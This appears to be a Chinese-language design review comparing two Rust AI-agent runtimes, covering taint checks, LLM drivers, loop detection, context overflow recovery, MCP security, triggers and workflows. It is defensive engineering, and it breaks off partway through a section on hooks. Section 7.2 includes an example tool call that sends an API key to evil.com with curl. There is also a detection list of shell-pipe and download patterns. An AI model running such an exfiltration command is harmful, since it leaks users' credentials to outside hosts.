    pub source: String, // 來源 (如 "llm_tool_call")
}

pub struct TaintSink {
    pub name: String,
    pub blocked_labels: HashSet<TaintLabel>,
}

impl TaintSink {
    pub fn shell_exec() -> Self { /* 阻擋 ExternalNetwork + Secret */ }
    pub fn net_fetch() -> Self { /* 阻擋 Secret */ }
}

impl TaintedValue {
    pub fn check_sink(&self, sink: &TaintSink) -> Result<(), TaintViolation> {
        for label in &self.labels {
            if sink.blocked_labels.contains(label) {
                return Err(TaintViolation { ... });
            }
        }
        Ok(())
    }
}
```

### 7.2 資料流

```
LLM 輸出 tool_call("shell_exec", {"command": "curl http://evil.com?key=$API_KEY"})
     |
     v
check_taint_shell_exec():
  [1] contains_shell_metacharacters("curl...") -- 無 metachar
  [2] 匹配 "curl " 模式 -> TaintLabel::ExternalNetwork
  [3] TaintedValue.check_sink(shell_exec()) -> BLOCKED
     |
     v
ToolResult { is_error: true, content: "Taint violation: ..." }
```

clawtex-core 完全沒有汙染追蹤機制。模型可以:
- 通過 `curl` 將 API key 傳送到外部
- 通過 `http_request` 工具將敏感資料嵌入 URL
- 通過 file_write 寫入密鑰到可存取的路徑

**Clawtex 實作建議** (P1): 不需要完整的 TaintLabel 系統, 先加入啟發式檢查:

```rust
// src/tools/taint_check.rs
pub fn check_shell_taint(command: &str) -> Option<String> {
    let suspicious = ["curl ", "wget ", "| sh", "| bash", "base64 -d", "eval "];
    for p in &suspicious {
        if command.contains(p) && (command.contains("API_KEY") || command.contains("SECRET")) {
            return Some(format!("Potential data exfiltration: command contains '{}'", p));
        }
    }
    None
}

pub fn check_url_taint(url: &str) -> Option<String> {
    let lower = url.to_lowercase();
    for p in &["api_key=", "token=", "secret=", "password="] {
        if lower.contains(p) {
            return Some(format!("URL contains sensitive parameter: {}", p));
        }
    }
    None
}
```

---

## 8. LlmDriver Trait 與驅動器

### 8.1 Trait 定義

**檔案**: `crates/openfang-runtime/src/llm_driver.rs` (200 行)

```rust
#[derive(Error, Debug)]
pub enum LlmError {
    Http(String),
    Api { status: u16, message: String },
    RateLimited { retry_after_ms: u64 },
    Parse(String),
    MissingApiKey(String),
    Overloaded { retry_after_ms: u64 },
    AuthenticationFailed(String),
    ModelNotFound(String),
}

pub struct CompletionRequest {
    pub model: String,
    pub messages: Vec<Message>,
    pub tools: Vec<ToolDefinition>,
    pub max_tokens: u32,
    pub temperature: f32,
    pub system: Option<String>,
    pub thinking: Option<ThinkingConfig>, // 延伸思考配置
}

pub struct CompletionResponse {
    pub content: Vec<ContentBlock>,
    pub stop_reason: StopReason,
    pub tool_calls: Vec<ToolCall>,
    pub usage: TokenUsage,
}

pub enum StreamEvent {
    TextDelta { text: String },
    ToolUseStart { id: String, name: String },
    ToolInputDelta { text: String },
    ToolUseEnd { id: String, name: String, input: Value },
    ThinkingDelta { text: String },
    ContentComplete { stop_reason: StopReason, usage: TokenUsage },
    PhaseChange { phase: String, detail: Option<String> },
    ToolExecutionResult { name: String, result_preview: String, is_error: bool },
}

#[async_trait]
pub trait LlmDriver: Send + Sync {
    async fn complete(&self, request: CompletionRequest) -> Result<CompletionResponse, LlmError>;
    async fn stream(
        &self,
        request: CompletionRequest,
        tx: mpsc::Sender<StreamEvent>,
    ) -> Result<CompletionResponse, LlmError> {
        // 預設實作: 包裝 complete()
    }
}
```

### 8.2 35+ 提供者映射

**檔案**: `crates/openfang-runtime/src/drivers/mod.rs`

```
groq, openrouter, deepseek, together, mistral, fireworks, openai,
gemini/google, ollama, vllm, lmstudio, lemonade, perplexity, cohere,
ai21, cerebras, sambanova, huggingface, xai, replicate,
github-copilot/copilot, codex/openai-codex, claude-code,
moonshot/kimi/kimi2, kimi_coding, qwen/dashscope/model_studio,
minimax, zhipu/glm, zhipu_coding/codegeex, zai/z.ai, zai_coding,
qianfan/baidu, volcengine/doubao, chutes, venice
```

### 8.3 DriverConfig 安全設計

```rust
pub struct DriverConfig {
    pub provider: String,
    pub api_key: Option<String>,
    pub base_url: Option<String>,
    pub skip_permissions: bool, // Claude Code --dangerously-skip-permissions
}

// Custom Debug: API key 永遠被遮蔽
impl std::fmt::Debug for DriverConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("DriverConfig")
            .field("api_key", &self.api_key.as_ref().map(|_| "<redacted>"))
            .finish()
    }
}
```

### 8.4 與 clawtex-core Provider trait 對比

| 面向 | OpenFang `LlmDriver` | clawtex `Provider` |
|------|---------------------|-------------------|
| 錯誤型別 | 8 種結構化 `LlmError` | `anyhow::Error` |
| 串流 | `mpsc::Sender<StreamEvent>` (8 事件型別) | `Pin<Box<dyn Stream<StreamChunk>>>` |
| API Key 遮蔽 | Custom Debug impl | 無 |
| ThinkingConfig | 內建支援 extended thinking | 無 |
| ToolUse 串流 | ToolUseStart/ToolInputDelta/ToolUseEnd | 僅 TextDelta |
| 預設 stream | 包裝 complete() 的預設實作 | 每個 provider 必須自行實作 |

**Clawtex 實作建議**:

1. **結構化 LLM 錯誤** (P1): 從 `anyhow::Error` 改為:
```rust
#[derive(thiserror::Error, Debug)]
pub enum LlmError {
    #[error("Rate limited, retry after {retry_after_ms}ms")]
    RateLimited { retry_after_ms: u64 },
    #[error("API error ({status}): {message}")]
    Api { status: u16, message: String },
    #[error("Auth failed: {0}")]
    AuthFailed(String),
    // ...
}
```

2. **API Key Debug 遮蔽**: 在所有 provider 結構加入 custom Debug, 防止 log 洩漏。

---

## 9. Qwen Code Driver CLI 驅動

### 9.1 架構

**檔案**: `crates/openfang-runtime/src/drivers/qwen_code.rs` (約 400 行)

```rust
pub struct QwenCodeDriver {
    cli_path: String,        // 預設 "qwen" (PATH 解析)
    skip_permissions: bool,  // --yolo 旗標
}
```

### 9.2 CLI 呼叫流程

```
CompletionRequest
     |
     v
build_prompt(): [System]\n{sys}\n[User]\n{msg}\n[Assistant]\n{reply}
     |
     v
build_args(): ["-p", prompt, "--output-format", "json", "--yolo", "--model", model]
     |
     v
apply_env_filter(): 移除 28 個已知 API key + 匹配 *_SECRET/*_TOKEN 後綴
     |
     v
tokio::process::Command::new("qwen")
  .env_remove(OPENAI_API_KEY)  // 不是 env_clear!
  .env_remove(ANTHROPIC_API_KEY)
  // ...移除敏感變數
     |
     v
解析 JSON 輸出:
  { "result": "...", "usage": { "input_tokens": N, "output_tokens": M } }
     |
     v
CompletionResponse
```

### 9.3 環境過濾 (與 SubprocessSandbox 不同)

```rust
const SENSITIVE_ENV_EXACT: &[&str] = &[
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GEMINI_API_KEY",
    "GOOGLE_API_KEY", "GROQ_API_KEY", "DEEPSEEK_API_KEY",
    // ... 28 個明確 key
];
const SENSITIVE_SUFFIXES: &[&str] = &["_SECRET", "_TOKEN", "_PASSWORD"];

fn apply_env_filter(cmd: &mut tokio::process::Command) {
    for key in SENSITIVE_ENV_EXACT { cmd.env_remove(key); }
    for (key, _) in std::env::vars() {
        if key.starts_with("QWEN_") { continue; } // 保留 Qwen 自己的
        for suffix in SENSITIVE_SUFFIXES {
            if key.to_uppercase().ends_with(suffix) {
                cmd.env_remove(&key);
            }
        }
    }
}
```

**注意**: 這裡用的是 `env_remove` (denylist), 而 `SubprocessSandbox` 用的是 `env_clear` (allowlist)。Qwen Code driver 的策略較寬鬆, 因為 Qwen CLI 本身需要某些環境變數才能正常運作。

### 9.4 串流模式

```rust
async fn stream(&self, request: CompletionRequest, tx: Sender<StreamEvent>) -> Result<...> {
    // --output-format stream-json --verbose
    // 逐行讀取 stdout:
    //   { "type": "text", "content": "..." }
    //   { "type": "result", "result": "...", "usage": {...} }
    let mut cmd = tokio::process::Command::new(&self.cli_path);
    // ... (non-blocking line reader)
    let reader = BufReader::new(child.stdout.take().unwrap());
    let mut lines = reader.lines();
    while let Ok(Some(line)) = lines.next_line().await {
        if let Ok(event) = serde_json::from_str::<QwenStreamEvent>(&line) {
            match event.r#type.as_str() {
                "text" => tx.send(StreamEvent::TextDelta { text }).await,
                "result" => { /* final */ },
                _ => {}
            }
        }
    }
}
```

### 9.5 與 clawtex chatgpt_backend 對比

| 面向 | OpenFang `QwenCodeDriver` | clawtex `ChatGPTBackendProvider` |
|------|--------------------------|--------------------------------|
| CLI 工具 | `qwen -p --output-format json` | `codex --ephemeral` |
| 環境過濾 | `env_remove()` (denylist) | `env_clear()` + `safe_subprocess_env()` |
| 串流 | stream-json 格式, line-by-line | 無串流 (僅完整輸出) |
| 認證 | Qwen OAuth (CLI 自帶) | OpenAI API key via env |
| 模型映射 | `model_flag()` 映射表 | 直接傳遞 model string |
| 錯誤偵測 | 偵測 auth/login 關鍵字 | 僅 stderr output |

**Clawtex 實作建議**: clawtex 的 `chatgpt_backend` 已使用更安全的 `env_clear()` 策略, 這是正確的。可以學習 OpenFang 的模型映射和認證錯誤偵測模式。

---

## 10. FallbackDriver 鏈式降級

### 10.1 完整實作

**檔案**: `crates/openfang-runtime/src/drivers/fallback.rs` (115 行)

```rust
pub struct FallbackDriver {
    drivers: Vec<(Arc<dyn LlmDriver>, String)>, // (driver, model_name)
}

#[async_trait]
impl LlmDriver for FallbackDriver {
    async fn complete(&self, request: CompletionRequest) -> Result<CompletionResponse, LlmError> {
        let mut last_error = None;
        for (i, (driver, model_name)) in self.drivers.iter().enumerate() {
            let mut req = request.clone();
            if !model_name.is_empty() {
                req.model = model_name.clone(); // 降級時可切換模型
            }
            match driver.complete(req).await {
                Ok(response) => return Ok(response),
                Err(e) => {
                    warn!(driver_index = i, error = %e, "Fallback driver failed");
                    last_error = Some(e);
                }
            }
        }
        Err(last_error.unwrap_or_else(|| LlmError::Api {
            status: 0, message: "No drivers configured".to_string()
        }))
    }
    // stream() 也有同樣的降級邏輯
}
```

### 10.2 資料流

```
Request --> Driver[0] (primary)
              |
              +-- Ok --> Return
              +-- Err --> Driver[1] (fallback 1)
                            |
                            +-- Ok --> Return
                            +-- Err --> Driver[2] (fallback 2)
                                          |
                                          +-- Ok --> Return
                                          +-- Err --> Return last_error
```

clawtex-core 有 `RotationProvider` 和 `RouterProvider`, 但降級邏輯在 `LlmRouter` 層面, 不在 driver 層面。OpenFang 的方式更清晰: `FallbackDriver` 本身就是一個 `LlmDriver`, 可以嵌套組合。

**Clawtex 實作建議**: clawtex 的 `RotationProvider` 已有類似功能, 但可以學習 OpenFang 的 "per-driver model override" 設計, 讓降級時可以切換到不同模型 (如 claude-sonnet -> gpt-4o -> groq/llama)。

---

## 11. LoopGuard 迴圈偵測

### 11.1 架構

**檔案**: `crates/openfang-runtime/src/loop_guard.rs` (約 300 行)

```rust
pub struct LoopGuardConfig {
    pub warn_threshold: u32,           // 3: 相同呼叫警告門檻
    pub block_threshold: u32,          // 5: 相同呼叫阻擋門檻
    pub global_circuit_breaker: u32,   // 30: 全域斷路器
    pub poll_multiplier: u32,          // 3: 輪詢工具倍率
    pub outcome_warn_threshold: u32,   // 2: 相同結果警告
    pub outcome_block_threshold: u32,  // 3: 相同結果阻擋
    pub ping_pong_min_repeats: u32,    // 3: A-B-A-B 模式偵測
    pub max_warnings_per_call: u32,    // 3: 警告升級閾值
}

pub enum LoopGuardVerdict {
    Allow,                  // 正常執行
    Warn(String),           // 執行但附加警告
    Block(String),          // 阻擋此次呼叫
    CircuitBreak(String),   // 中斷整個 agent loop
}
```

### 11.2 偵測策略

```
Tool Call 進入
     |
     v
[1] Global Circuit Breaker: total_calls > 30?
     |-- Yes --> CircuitBreak
     |-- No  --> continue
     |
     v
[2] SHA-256 hash(tool_name + params)
     |
     v
[3] Outcome Block: 之前相同呼叫+結果已觸發 block?
     |-- Yes --> Block
     |-- No  --> continue
     |
     v
[4] Per-Hash Threshold:
     call_count >= block_threshold * (poll? 3 : 1)?
     |-- Yes --> Block
     |-- No  --> continue
     |
     v
[5] call_count >= warn_threshold?
     |-- Yes --> Warn
     |-- No  --> Allow
     |
     v
[6] Ping-Pong Detection: A-B-A-B-A-B 在 recent_calls (30條)?
     |-- Yes --> Block "alternating pattern detected"
     |-- No  --> Allow
```

### 11.3 與 clawtex AdvancedLoopDetector 對比

| 功能 | OpenFang `LoopGuard` | clawtex `AdvancedLoopDetector` |
|------|---------------------|-------------------------------|
| Hash 演算法 | SHA-256 | SHA-256 |
| Ping-Pong | 有 (ring buffer 30 entries) | 有 (LoopKind::PingPong) |
| Outcome-Aware | 有 (result hash tracking) | 無 |
| Poll 工具寬鬆 | `poll_multiplier` (shell_exec) | 無 |
| Backoff 建議 | 有 (5s, 10s, 30s, 60s schedule) | 無 |
| Warning 升級 | 重複警告後自動升級為 Block | 無 |
| Circuit Breaker | 全域 30 call 上限 | 無全域上限 |
| Statistics | `LoopGuardStats` API | 無 |

**Clawtex 實作建議**: clawtex 的 `AdvancedLoopDetector` 已有 ping-pong 偵測, 但缺少:

1. **Outcome-Aware** (P2): 追蹤 result hash, 相同呼叫+相同結果比相同呼叫更快觸發 block
2. **Global Circuit Breaker** (P1): 加入全域上限防止 runaway agent
3. **Poll Multiplier** (P2): 對 shell 等需要反覆呼叫的工具放寬閾值

---

## 12. Context Budget 動態預算

### 12.1 架構

**檔案**: `crates/openfang-runtime/src/context_budget.rs` (約 200 行)

```rust
pub struct ContextBudget {
    pub context_window_tokens: usize,
    pub tool_chars_per_token: f64,     // 2.0 (工具結果較密)
    pub general_chars_per_token: f64,  // 4.0 (一般文字)
}

impl ContextBudget {
    pub fn per_result_cap(&self) -> usize {
        // 30% of context window in chars
        (context_window * 0.30 * 2.0) as usize
    }
    pub fn single_result_max(&self) -> usize {
        // 50% of context window in chars
        (context_window * 0.50 * 2.0) as usize
    }
    pub fn total_tool_headroom_chars(&self) -> usize {
        // 75% of context window in chars
        (context_window * 0.75 * 2.0) as usize
    }
}
```

### 12.2 雙層截斷系統

```
Layer 1: Per-Result Cap
  每個工具結果 <= 30% of context window
  truncate_tool_result_dynamic():
    - 在 newline 處斷開 (避免截斷行中間)
    - char boundary 安全 (UTF-8 不會截斷)
    - 附加 [TRUNCATED] 標記

Layer 2: Context Guard
  所有工具結果總和 <= 75% of context window
  apply_context_guard():
    - 計算所有 ToolResult 總字元數
    - 超過時從最舊的結果開始壓縮
    - 單一結果 > 50% 時先壓縮到上限
```

clawtex-core 使用固定的 `MAX_TOOL_RESULT_CHARS` 截斷, 不考慮上下文視窗大小。

**Clawtex 實作建議** (P1): 根據模型的 context window 動態調整截斷閾值:
```rust
fn max_tool_result_chars(context_window: usize) -> usize {
    (context_window as f64 * 0.30 * 2.0) as usize // 30% of window
}
```

---

## 13. Context Overflow 4 階段恢復

### 13.1 完整流程

**檔案**: `crates/openfang-runtime/src/context_overflow.rs` (137 行)

```rust
pub enum RecoveryStage {
    None,                              // 無需恢復
    AutoCompaction { removed: usize }, // Stage 1: 溫和修剪
    OverflowCompaction { removed: usize }, // Stage 2: 激進修剪
    ToolResultTruncation { truncated: usize }, // Stage 3: 工具結果壓縮
    FinalError,                        // Stage 4: 無法恢復
}

pub fn recover_from_overflow(
    messages: &mut Vec<Message>,
    system_prompt: &str,
    tools: &[ToolDefinition],
    context_window: usize,
) -> RecoveryStage {
    let estimated = estimate_tokens(messages, system_prompt, tools);
    let threshold_70 = (context_window * 0.70) as usize;
    let threshold_90 = (context_window * 0.90) as usize;

    if estimated <= threshold_70 { return RecoveryStage::None; }

    // Stage 1: 保留最後 10 條 (70-90% 觸發)
    // Stage 2: 保留最後 4 條 + 摘要標記 (>90% 觸發)
    // Stage 3: 所有歷史工具結果壓縮到 2K chars
    // Stage 4: 建議 /reset 或 /compact
}
```

### 13.2 資料流

```
estimated_tokens(messages)
     |
     +-- <= 70% window --> None (不動)
     |
     +-- 70-90% --> Stage 1: keep last 10 messages
     |                  |
     |                  +-- re-estimate <= 70% --> AutoCompaction
     |                  +-- still > 70% --> fall through
     |
     +-- > 90% --> Stage 2: keep last 4 + summary marker
     |                  |
     |                  +-- re-estimate <= 90% --> OverflowCompaction
     |                  +-- still > 90% --> fall through
     |
     +-- Stage 3: truncate all tool results to 2K chars
     |                  |
     |                  +-- re-estimate <= 90% --> ToolResultTruncation
     |                  +-- still > 90% --> FinalError
```

clawtex-core 沒有任何 context overflow 恢復機制。當對話超過上下文視窗時, LLM API 會直接返回錯誤。

**Clawtex 實作建議** (P0, 約 2 小時):

```rust
// src/context_overflow.rs (新檔案)
pub fn recover_from_overflow(
    messages: &mut Vec<ChatMessage>,
    context_window: usize,
) -> RecoveryResult {
    let estimated = estimate_tokens(messages);
    if estimated < context_window * 70 / 100 { return RecoveryResult::None; }

    // Stage 1: trim to last 10
    if messages.len() > 10 {
        let removed = messages.len() - 10;
        messages.drain(..removed);
        if estimate_tokens(messages) < context_window * 70 / 100 {
            return RecoveryResult::Trimmed(removed);
        }
    }

    // Stage 2: trim to last 4 + marker
    if messages.len() > 4 {
        let removed = messages.len() - 4;
        messages.drain(..removed);
        messages.insert(0, ChatMessage::system(
            format!("[{removed} earlier messages removed due to context overflow]")
        ));
    }

    RecoveryResult::AggressiveTrim
}
```

---

## 14. MCP Client 協議實作

### 14.1 架構

**檔案**: `crates/openfang-runtime/src/mcp.rs` (約 600 行)

```rust
pub struct McpConnection {
    config: McpServerConfig,
    tools: Vec<ToolDefinition>,
    original_names: HashMap<String, String>, // namespaced -> raw
    transport: McpTransportHandle,
    next_id: u64,
}

enum McpTransportHandle {
    Stdio {
        child: Box<tokio::process::Child>,
        stdin: ChildStdin,
        stdout: BufReader<ChildStdout>,
    },
    Sse {
        client: reqwest::Client,
        url: String,
    },
}
```

### 14.2 連接流程

```
McpConnection::connect(config)
     |
     v
McpTransport::Stdio --> connect_stdio()
  |                       |
  |                   validate path (no "..")
  |                   Windows: resolve .cmd wrappers
  |                   env_clear() + whitelist
  |                   spawn subprocess
  |                   stderr -> background logging task
  |
  +-- McpTransport::Sse --> connect_sse()
                              |
                          SSRF check (block 169.254.169.254)
                          reqwest::Client with 30s timeout
     |
     v
initialize(): JSON-RPC "initialize"
  { "protocolVersion": "2024-11-05",
    "clientInfo": { "name": "openfang" } }
     |
     v
notifications/initialized (no response)
     |
     v
discover_tools(): JSON-RPC "tools/list"
  -> namespace: mcp_{server}_{tool}
  -> store original_names for call back
     |
     v
Ready
```

### 14.3 Tool Namespacing

```rust
pub fn format_mcp_tool_name(server: &str, tool: &str) -> String {
    format!("mcp_{}_{}", normalize_name(server), normalize_name(tool))
}
// "github" + "create_issue" -> "mcp_github_create_issue"
// "my-server" + "do-thing" -> "mcp_my_server_do_thing"

pub fn is_mcp_tool(name: &str) -> bool { name.starts_with("mcp_") }
pub fn extract_mcp_server(name: &str) -> Option<&str> { /* ... */ }
```

### 14.4 安全設計

1. **Path Traversal**: `command.contains("..")` -> reject
2. **SSRF**: SSE URL 阻擋 `169.254.169.254` 和 `metadata.google`
3. **Env Sandboxing**: Stdio subprocess 使用 `env_clear()` + whitelist
4. **Windows Compat**: 自動偵測 `.cmd` wrapper (`npx.cmd`)
5. **Timeout**: 每個請求 60s 超時
6. **Drop**: `impl Drop` 自動 kill 子程序

### 14.5 與 clawtex mcp_client 對比

| 面向 | OpenFang | clawtex |
|------|----------|---------|
| 傳輸 | Stdio + SSE 雙模式 | 僅 Stdio |
| Namespace | `mcp_{server}_{tool}` | 類似 |
| SSRF | 有 (metadata endpoint) | 無 |
| Windows .cmd | 自動偵測 | 無 |
| Env sandbox | env_clear + whitelist | 繼承全部環境 |
| Background stderr | 有 (spawn logging task) | 無 |
| Original name mapping | 有 (hyphen preservation) | 無 |

**Clawtex 實作建議**:

1. **MCP Env Sandbox** (P1): MCP 子程序也應該 `env_clear()` 而非繼承全部環境
2. **Windows .cmd** (P1): 在 Windows 上自動偵測 `.cmd` wrapper
3. **SSE 傳輸** (P2): 加入 HTTP SSE 傳輸模式支援

---

## 15. TriggerEngine 事件驅動觸發

### 15.1 架構

**檔案**: `crates/openfang-kernel/src/triggers.rs` (約 500 行)

```rust
pub enum TriggerPattern {
    Lifecycle,                          // 所有生命週期事件
    AgentSpawned { name_pattern: String }, // 特定 agent 產生
    AgentTerminated,                    // 任何 agent 終止
    System,                             // 系統事件
    SystemKeyword { keyword: String },  // 系統事件關鍵字
    MemoryUpdate,                       // 記憶更新
    MemoryKeyPattern { key_pattern: String }, // 特定 key 的記憶更新
    All,                                // 萬用匹配
    ContentMatch { substring: String }, // 內容子串匹配
}

pub struct Trigger {
    pub id: TriggerId,
    pub agent_id: AgentId,
    pub pattern: TriggerPattern,
    pub prompt_template: String,  // "Event: {{event}}"
    pub enabled: bool,
    pub fire_count: u64,
    pub max_fires: u64,           // 0 = 無限
}

pub struct TriggerEngine {
    triggers: DashMap<TriggerId, Trigger>,
    agent_triggers: DashMap<AgentId, Vec<TriggerId>>,
}
```

### 15.2 事件匹配邏輯

```rust
fn matches_pattern(pattern: &TriggerPattern, event: &Event, description: &str) -> bool {
    match pattern {
        All => true,
        Lifecycle => matches!(event.payload, EventPayload::Lifecycle(_)),
        AgentSpawned { name_pattern } => {
            if let EventPayload::Lifecycle(LifecycleEvent::Spawned { name, .. }) = &event.payload {
                name.contains(name_pattern) || name_pattern == "*"
            } else { false }
        }
        SystemKeyword { keyword } => {
            if let EventPayload::System(se) = &event.payload {
                format!("{:?}", se).to_lowercase().contains(&keyword.to_lowercase())
            } else { false }
        }
        MemoryKeyPattern { key_pattern } => {
            if let EventPayload::MemoryUpdate(delta) = &event.payload {
                delta.key.contains(key_pattern) || key_pattern == "*"
            } else { false }
        }
        ContentMatch { substring } => {
            description.to_lowercase().contains(&substring.to_lowercase())
        }
        // ...
    }
}
```

### 15.3 Trigger 遷移 (手 reactivation)

```rust
// 手 (workflow) 重啟時, 需要將 trigger 遷移到新 agent
pub fn take_agent_triggers(&self, agent_id: AgentId) -> Vec<Trigger>
pub fn restore_triggers(&self, new_agent_id: AgentId, triggers: Vec<Trigger>) -> usize
pub fn reassign_agent_triggers(&self, old: AgentId, new: AgentId) -> usize
```

### 15.4 資料流

```
EventBus.publish(event)
     |
     v
TriggerEngine.evaluate(event)
     |
     v
For each registered Trigger:
  [1] enabled? max_fires check
  [2] matches_pattern()?
  [3] prompt = template.replace("{{event}}", description)
  [4] fire_count++
     |
     v
返回 Vec<(AgentId, String)> -- (要通知的 agent, 要傳送的訊息)
     |
     v
Kernel: 對每個匹配的 agent 傳送訊息
```

clawtex-core 沒有事件驅動觸發系統。cron jobs 是時間觸發, 但沒有事件觸發。

**Clawtex 實作建議** (P2, 約 4 小時):

這是一個很強大的功能。當 agent A 完成任務時, 可以自動觸發 agent B。建議:

```rust
// src/triggers.rs (新檔案)
pub enum TriggerPattern {
    HandCompleted { hand_name: String },     // 手完成時
    ToolExecuted { tool_name: String },      // 工具執行時
    MemoryUpdated { key_pattern: String },   // 記憶更新時
    CostExceeded { threshold_usd: f64 },     // 成本超閾值
}

pub struct TriggerEngine {
    triggers: Vec<Trigger>,
}

impl TriggerEngine {
    pub fn evaluate(&self, event: &AgentEvent) -> Vec<(String, String)> {
        // 返回 (agent_name, prompt) 配對
    }
}
```

---

## 16. EventBus 事件匯流排

### 16.1 架構

**檔案**: `crates/openfang-kernel/src/event_bus.rs` (150 行)

```rust
pub struct EventBus {
    sender: broadcast::Sender<Event>,           // 全域廣播
    agent_channels: DashMap<AgentId, broadcast::Sender<Event>>, // 每 agent 頻道
    history: Arc<RwLock<VecDeque<Event>>>,       // 環形緩衝 (1000 events)
}
```

### 16.2 路由策略

```rust
pub async fn publish(&self, event: Event) {
    // 存入歷史
    history.push_back(event.clone());
    if history.len() > 1000 { history.pop_front(); }

    match event.target {
        EventTarget::Agent(id) => {
            // 只送到特定 agent
            agent_channels.get(&id).send(event);
        }
        EventTarget::Broadcast => {
            // 送到全域 + 所有 agent
            sender.send(event.clone());
            for ch in agent_channels.iter() {
                ch.send(event.clone());
            }
        }
        EventTarget::System => {
            sender.send(event);
        }
        EventTarget::Pattern(_) => {
            sender.send(event); // Phase 1: 廣播
        }
    }
}
```

clawtex-core 有 `AgentEventBus` (`src/agent_events.rs`), 使用 `tokio::sync::broadcast`. 但沒有:
- 每 agent 獨立頻道
- 事件歷史環形緩衝
- Pattern 路由

**Clawtex 實作建議**: clawtex 的 EventBus 已足夠基本使用。當需要 trigger system 時再加入 per-agent channels。

---

## 17. WorkflowEngine 工作流引擎

### 17.1 架構

**檔案**: `crates/openfang-kernel/src/workflow.rs` (約 700 行)

```rust
pub struct Workflow {
    pub id: WorkflowId,
    pub name: String,
    pub steps: Vec<WorkflowStep>,
}

pub struct WorkflowStep {
    pub name: String,
    pub agent: StepAgent,           // ById or ByName
    pub prompt_template: String,    // "{{input}}" + "{{var_name}}"
    pub mode: StepMode,
    pub timeout_secs: u64,
    pub error_mode: ErrorMode,
    pub output_var: Option<String>, // 儲存輸出到命名變數
}

pub enum StepMode {
    Sequential,                     // 順序執行
    FanOut,                         // 平行扇出
    Collect,                        // 收集扇出結果
    Conditional { condition: String }, // 條件跳過
    Loop { max_iterations: u32, until: String }, // 迴圈
}

pub enum ErrorMode {
    Fail,                           // 錯誤中止
    Skip,                           // 錯誤跳過
    Retry { max_retries: u32 },     // 重試
}
```

### 17.2 執行流程

```rust
pub async fn execute_run<F, Fut>(
    &self,
    run_id: WorkflowRunId,
    agent_resolver: impl Fn(&StepAgent) -> Option<(AgentId, String)>,
    send_message: F,  // 閉包: 傳送訊息到 agent
) -> Result<String, String>
where
    F: Fn(AgentId, String) -> Fut,
    Fut: Future<Output = Result<(String, u64, u64), String>>,
```

核心設計: WorkflowEngine 不持有 kernel 參考, 而是通過閉包 `send_message` 與 kernel 解耦。

### 17.3 與 clawtex HandRunner 對比

| 功能 | OpenFang `WorkflowEngine` | clawtex `HandRunner` |
|------|--------------------------|---------------------|
| **定義格式** | JSON/Rust structs | TOML (hand.toml) |
| **步驟模式** | Sequential/FanOut/Collect/Conditional/Loop | Sequential + Condition |
| **平行執行** | FanOut + `join_all` | 無 |
| **迴圈** | Loop { until, max_iterations } | 無 |
| **命名變數** | `{{var_name}}` 模板替換 | 無 (僅 `{{previous_output}}`) |
| **錯誤模式** | Fail/Skip/Retry | 失敗中止 |
| **Agent 路由** | ById/ByName 解析 | 固定 provider+model |
| **超時** | 每步驟可配置 | 無 |
| **Run 管理** | WorkflowRun + 狀態追蹤 + 200 run 上限 | 無歷史追蹤 |
| **Kernel 解耦** | 閉包注入 (無 kernel 依賴) | 直接呼叫 AgentRuntime |
| **Guardrail** | 無 | L1 guardrail + L2 eval |
| **Chaining** | 無內建 | `chain_to` 欄位 |

clawtex 的優勢: L1 guardrail (格式驗證) + L2 eval (LLM-as-Judge), OpenFang 沒有。
OpenFang 的優勢: FanOut 平行, Loop 迴圈, 命名變數, 錯誤策略。

**Clawtex 實作建議**:

1. **FanOut 平行** (P2): 在 Hand 的 Phase 中加入 `parallel: true` 旗標, 同層多個 phase 可平行執行
2. **命名變數** (P1): 允許 `{{phase_name.output}}` 引用特定 phase 的輸出
3. **Retry ErrorMode** (P1): 在 Phase 加入 `retry: 3` 配置

---

## 18. Supervisor 程序監督

### 18.1 架構

**檔案**: `crates/openfang-kernel/src/supervisor.rs` (228 行)

```rust
pub struct Supervisor {
    shutdown_tx: watch::Sender<bool>,
    shutdown_rx: watch::Receiver<bool>,
    restart_count: AtomicU64,
    panic_count: AtomicU64,
    agent_restarts: DashMap<AgentId, u32>,
}

impl Supervisor {
    pub fn subscribe(&self) -> watch::Receiver<bool>  // 訂閱關機信號
    pub fn shutdown(&self)                             // 觸發優雅關機
    pub fn record_panic(&self)                         // 記錄 panic
    pub fn record_agent_restart(&self, id: AgentId, max: u32) -> Result<u32, u32>
    pub fn reset_agent_restarts(&self, id: AgentId)    // 手動重設
    pub fn health(&self) -> SupervisorHealth           // 健康報告
}
```

### 18.2 Agent 重啟限制

```rust
pub fn record_agent_restart(&self, agent_id: AgentId, max_restarts: u32) -> Result<u32, u32> {
    let mut count = self.agent_restarts.entry(agent_id).or_insert(0);
    *count += 1;
    if max_restarts > 0 && *count > max_restarts {
        Err(*count) // 超過限制
    } else {
        Ok(*count)  // 在限制內
    }
}
```

clawtex-core 沒有 Supervisor 概念。daemon 崩潰後需手動重啟。

**Clawtex 實作建議** (P2): 加入簡單的 panic 計數和優雅關機:
```rust
// src/supervisor.rs
pub struct Supervisor {
    shutdown: Arc<AtomicBool>,
    panic_count: AtomicU64,
}
```

---

## 19. Capability Manager 權限管理

### 19.1 架構

**檔案**: `crates/openfang-kernel/src/capabilities.rs` (96 行)

```rust
pub struct CapabilityManager {
    grants: DashMap<AgentId, Vec<Capability>>,
}

pub enum Capability {
    ToolInvoke(String),    // 可呼叫特定工具
    AgentSend(String),     // 可傳送訊息給特定 agent
    FileAccess(String),    // 可存取特定路徑
    NetworkAccess(String), // 可存取特定網域
    // ...
}

impl CapabilityManager {
    pub fn grant(&self, agent_id: AgentId, capabilities: Vec<Capability>)
    pub fn check(&self, agent_id: AgentId, required: &Capability) -> CapabilityCheck
    pub fn revoke_all(&self, agent_id: AgentId)
}
```

clawtex-core 的工具權限透過 `agents.toml` 的 `tools = [...]` 配置, 但執行時沒有 capability check。

**Clawtex 實作建議**: 現有的 `tools` 配置已是隱式 capability list。可以在 tool dispatch 中加入檢查:
```rust
if !agent_config.tools.contains(&tool_name) {
    return Err("Agent does not have capability to use this tool");
}
```

---

## 20. Hook Registry 生命週期鉤子

### 20.1 架構

**檔案**: `crates/openfang-runtime/src/hooks.rs` (150 行)

```rust
pub struct HookContext<'a> {
    pub agent_name: &'a str,
    pub agent_id: &'a str,
    pub event: HookEvent,
    pub data: serde_json::Value,
}

pub trait HookHandler: Send + Sync {
    fn on_event(&self, ctx: &HookContext) -> Result<(), String>;
    // BeforeToolCall: Err -> 阻擋工具
